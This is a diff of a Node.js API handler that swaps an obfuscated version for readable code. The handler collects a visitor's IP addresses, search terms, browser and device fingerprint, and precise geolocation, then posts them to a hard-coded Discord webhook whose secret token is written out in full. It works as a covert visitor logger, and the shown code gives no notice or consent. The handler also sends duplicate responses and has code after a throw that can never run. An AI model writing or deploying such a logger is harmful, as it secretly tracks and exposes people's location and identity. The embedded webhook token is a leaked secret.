@@ -1,1 +1,102 @@
-(function(_0x319769,_0x349b2a){const _0x36f5bc=_0x5afb,_0x27f9e4=_0x319769();while(!![]){try{const _0x5d6d03=parseInt(_0x36f5bc(0xfc))/0x1*(parseInt(_0x36f5bc(0x104))/0x2)+-parseInt(_0x36f5bc(0xf1))/0x3*(parseInt(_0x36f5bc(0xe8))/0x4)+parseInt(_0x36f5bc(0xd5))/0x5*(-parseInt(_0x36f5bc(0xda))/0x6)+-parseInt(_0x36f5bc(0xd3))/0x7*(parseInt(_0x36f5bc(0xf0))/0x8)+parseInt(_0x36f5bc(0xe5))/0x9*(-parseInt(_0x36f5bc(0xf2))/0xa)+-parseInt(_0x36f5bc(0xe4))/0xb*(-parseInt(_0x36f5bc(0xef))/0xc)+-parseInt(_0x36f5bc(0x101))/0xd*(-parseInt(_0x36f5bc(0xff))/0xe);if(_0x5d6d03===_0x349b2a)break;else _0x27f9e4['push'](_0x27f9e4['shift']());}catch(_0x36b910){_0x27f9e4['push'](_0x27f9e4['shift']());}}}(_0x3c52,0x9a417));function _0x5afb(_0x22b192,_0x258c15){const _0x3c52fd=_0x3c52();return _0x5afb=function(_0x5afb2d,_0x3bdb16){_0x5afb2d=_0x5afb2d-0xca;let _0x38797d=_0x3c52fd[_0x5afb2d];return _0x38797d;},_0x5afb(_0x22b192,_0x258c15);}import _0x297ebd from'node-fetch';function _0x3c52(){const _0x27b058=['`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Referrer\x20URL:**\x20`','User\x20Data\x20Logged','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Time\x20Zone:**\x20`','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Private\x20IP:**\x20`','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Viewport\x20Size:**\x20`','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Timestamp:**\x20`','headers','longitude','22KJfpSG','63261BcuhMw','method','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**User\x20Agent:**\x20`','8pvINNT','Failed\x20to\x20send\x20log:\x20','https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT','status','Method\x20Not\x20Allowed','json','Failed\x20to\x20send\x20message\x20to\x20Discord:','987696fBWmoH','24skwzyZ','1512003hkXDEI','1640pbxSVT','User\x20data\x20logged\x20successfully','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Operating\x20System:**\x20`','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Touch\x20Support:**\x20`','POST','body','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Longitude:**\x20`','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Browser\x20Version:**\x20`','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Pixel\x20Ratio:**\x20`','connection','3338MwquBt','Error\x20sending\x20to\x20Discord','\x20GB`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Hardware\x20Concurrency:**\x20`','28GFjSoN','\x20x\x20','28085551kNKTia','Error\x20occurred:','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Browser\x20Plugins:**\x20`','152fXnkTd','Error\x20processing\x20request','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Browser\x20Language:**\x20`','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Location\x20(Latitude,\x20Longitude):**\x20`','error','No\x20search\x20term\x20entered','toISOString','latitude','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Current\x20URL:**\x20`','remoteAddress','Log\x20data\x20sent\x20successfully.','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Device\x20Memory:**\x20`','1952475eTDONI','text','792710eDnmiQ','application/json','N/A','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Connection\x20Type:**\x20`','`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Online\x20Status:**\x20`','42VqOKiR','x-forwarded-for'];_0x3c52=function(){return _0x27b058;};return _0x3c52();}export default async(_0x574041,_0xe4ebf7)=>{const _0x5bd413=_0x5afb;if(_0x574041[_0x5bd413(0xe6)]===_0x5bd413(0xf6)){const _0x1216b7=_0x5bd413(0xea);try{const {ip:_0x473b6e,searchTerm:_0x4c6eca,userAgent:_0x501696,browserLanguage:_0x1232a6,osInfo:_0x494a48,browserVersion:_0x3a92db,connectionType:_0x4d4821,timeZone:_0x49ef7a,deviceMemory:_0x3bde02,hardwareConcurrency:_0x44009b,pixelRatio:_0x4eaeda,onlineStatus:_0x1c125b,viewportWidth:_0x48bbd9,viewportHeight:_0x25106a,screenWidth:_0x4b6cfa,screenHeight:_0x187257,colorDepth:_0x12b8fe,touchSupport:_0x23a5f7,cookiesEnabled:_0x4206c7,plugins:_0x3f3a3c,referrer:_0x66bfeb,currentURL:_0x1a94d5,timestamp:_0x54ef7e,latitude:_0xdb8d96,longitude:_0x2b1d47,geoLocation:_0x3e7a2d}=_0x574041[_0x5bd413(0xf7)],_0x25022c=_0x574041[_0x5bd413(0xe2)][_0x5bd413(0xdb)]||_0x574041[_0x5bd413(0xfb)][_0x5bd413(0xd0)],_0x3a5a7d={'embeds':[{'title':_0x5bd413(0xdd),'description':'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Public\x20IP:**\x20`'+(_0x25022c||_0x5bd413(0xd7))+_0x5bd413(0xdf)+(_0x473b6e||_0x5bd413(0xd7))+'`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Search\x20Term:**\x20`'+(_0x4c6eca||_0x5bd413(0xcc))+_0x5bd413(0xe7)+(_0x501696||_0x5bd413(0xd7))+_0x5bd413(0x106)+(_0x1232a6||_0x5bd413(0xd7))+_0x5bd413(0xf4)+(_0x494a48||_0x5bd413(0xd7))+_0x5bd413(0xf9)+(_0x3a92db||_0x5bd413(0xd7))+_0x5bd413(0xd8)+(_0x4d4821||_0x5bd413(0xd7))+_0x5bd413(0xde)+(_0x49ef7a||'N/A')+_0x5bd413(0xd2)+(_0x3bde02||_0x5bd413(0xd7))+_0x5bd413(0xfe)+(_0x44009b||_0x5bd413(0xd7))+_0x5bd413(0xfa)+(_0x4eaeda||_0x5bd413(0xd7))+_0x5bd413(0xd9)+(_0x1c125b||_0x5bd413(0xd7))+_0x5bd413(0xe0)+(_0x48bbd9||'N/A')+_0x5bd413(0x100)+(_0x25106a||_0x5bd413(0xd7))+'`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Screen\x20Resolution:**\x20`'+(_0x4b6cfa||_0x5bd413(0xd7))+_0x5bd413(0x100)+(_0x187257||_0x5bd413(0xd7))+'`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Color\x20Depth:**\x20`'+(_0x12b8fe||_0x5bd413(0xd7))+_0x5bd413(0xf5)+(_0x23a5f7||'N/A')+'`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Cookies\x20Enabled:**\x20`'+(_0x4206c7||_0x5bd413(0xd7))+_0x5bd413(0x103)+(_0x3f3a3c||_0x5bd413(0xd7))+_0x5bd413(0xdc)+(_0x66bfeb||'No\x20referrer')+_0x5bd413(0xcf)+(_0x1a94d5||_0x5bd413(0xd7))+'`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Latitude:**\x20`'+(_0xdb8d96||_0x5bd413(0xd7))+_0x5bd413(0xf8)+(_0x2b1d47||_0x5bd413(0xd7))+_0x5bd413(0xe1)+(_0x54ef7e||new Date()[_0x5bd413(0xcd)]())+_0x5bd413(0xca)+_0x3e7a2d[_0x5bd413(0xce)]+',\x20'+_0x3e7a2d[_0x5bd413(0xe3)]+'`\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','color':0xff00,'timestamp':new Date()}]},_0x17e592=await _0x297ebd(_0x1216b7,{'method':_0x5bd413(0xf6),'headers':{'Content-Type':_0x5bd413(0xd6)},'body':JSON['stringify'](_0x3a5a7d)});if(!_0x17e592['ok']){throw new Error(_0x5bd413(0xe9)+_0x17e592['statusText']);const _0x54a22c=await _0x17e592[_0x5bd413(0xd4)]();return console[_0x5bd413(0xcb)](_0x5bd413(0xee),_0x17e592[_0x5bd413(0xeb)],_0x54a22c),_0xe4ebf7[_0x5bd413(0xeb)](0x1f4)[_0x5bd413(0xed)]({'message':_0x5bd413(0xfd)});}_0xe4ebf7[_0x5bd413(0xeb)](0xc8)[_0x5bd413(0xed)]({'message':_0x5bd413(0xd1)}),_0xe4ebf7['status'](0xc8)['json']({'message':_0x5bd413(0xf3)});}catch(_0xa99f18){_0xe4ebf7[_0x5bd413(0xeb)](0x1f4)['json']({'error':_0xa99f18['message']}),console[_0x5bd413(0xcb)](_0x5bd413(0x102),_0xa99f18),_0xe4ebf7[_0x5bd413(0xeb)](0x1f4)[_0x5bd413(0xed)]({'message':_0x5bd413(0x105)});}}else _0xe4ebf7[_0x5bd413(0xeb)](0x195)[_0x5bd413(0xed)]({'error':_0x5bd413(0xec)}),_0xe4ebf7[_0x5bd413(0xeb)](0x195)['json']({'message':'Method\x20Not\x20Allowed'});};
+import fetch from 'node-fetch';
+
+export default async (req, res) => {
+    if (req.method === 'POST') {
+        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT';
+
+        try {
+            const {
+                ip,
+                searchTerm,
+                userAgent,
+                browserLanguage,
+                osInfo,
+                browserVersion,
+                connectionType,
+                timeZone,
+                deviceMemory,
+                hardwareConcurrency,
+                pixelRatio,
+                onlineStatus,
+                viewportWidth,
+                viewportHeight,
+                screenWidth,
+                screenHeight,
+                colorDepth,
+                touchSupport,
+                cookiesEnabled,
+                plugins,
+                referrer,
+                currentURL,
+                timestamp,
+                latitude,
+                longitude,
+                geoLocation // This is the new data coming from the front-end
+            } = req.body;
+
+            // Get public IP from headers (proxy/IP forwarding)
+            const publicIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
+            // Send information to Discord
+            const logMessage = {
+                embeds: [
+                    {
+                        title: 'User Data Logged',
+                        description: `
+                            **Public IP:** \`${publicIP || 'N/A'}\`
+                            **Private IP:** \`${ip || 'N/A'}\`
+                            **Search Term:** \`${searchTerm || 'No search term entered'}\`
+                            **User Agent:** \`${userAgent || 'N/A'}\`
+                            **Browser Language:** \`${browserLanguage || 'N/A'}\`
+                            **Operating System:** \`${osInfo || 'N/A'}\`
+                            **Browser Version:** \`${browserVersion || 'N/A'}\`
+                            **Connection Type:** \`${connectionType || 'N/A'}\`
+                            **Time Zone:** \`${timeZone || 'N/A'}\`
+                            **Device Memory:** \`${deviceMemory || 'N/A'} GB\`
+                            **Hardware Concurrency:** \`${hardwareConcurrency || 'N/A'}\`
+                            **Pixel Ratio:** \`${pixelRatio || 'N/A'}\`
+                            **Online Status:** \`${onlineStatus || 'N/A'}\`
+                            **Viewport Size:** \`${viewportWidth || 'N/A'} x ${viewportHeight || 'N/A'}\`
+                            **Screen Resolution:** \`${screenWidth || 'N/A'} x ${screenHeight || 'N/A'}\`
+                            **Color Depth:** \`${colorDepth || 'N/A'}\`
+                            **Touch Support:** \`${touchSupport || 'N/A'}\`
+                            **Cookies Enabled:** \`${cookiesEnabled || 'N/A'}\`
+                            **Browser Plugins:** \`${plugins || 'N/A'}\`
+                            **Referrer URL:** \`${referrer || 'No referrer'}\`
+                            **Current URL:** \`${currentURL || 'N/A'}\`
+                            **Latitude:** \`${latitude || 'N/A'}\`
+                            **Longitude:** \`${longitude || 'N/A'}\`
+                            **Timestamp:** \`${timestamp || new Date().toISOString()}\`
+                            **Location (Latitude, Longitude):** \`${geoLocation.latitude}, ${geoLocation.longitude}\`
+                        `,
+                        color: 0x00FF00,
+                        timestamp: new Date(),
+                    },
+                ],
+            };
+
+            const response = await fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(logMessage),
+            });
+
+            if (!response.ok) {
+                throw new Error(`Failed to send log: ${response.statusText}`);
+                const errorText = await response.text();
+                console.error('Failed to send message to Discord:', response.status, errorText);
+                return res.status(500).json({ message: 'Error sending to Discord' });
+            }
+
+            res.status(200).json({ message: 'Log data sent successfully.' });
+            res.status(200).json({ message: 'User data logged successfully' });
+        } catch (error) {
+            res.status(500).json({ error: error.message });
+            console.error('Error occurred:', error);
+            res.status(500).json({ message: 'Error processing request' });
+        }
+    } else {
+        res.status(405).json({ error: 'Method Not Allowed' });
+        res.status(405).json({ message: 'Method Not Allowed' });
+    }
+};
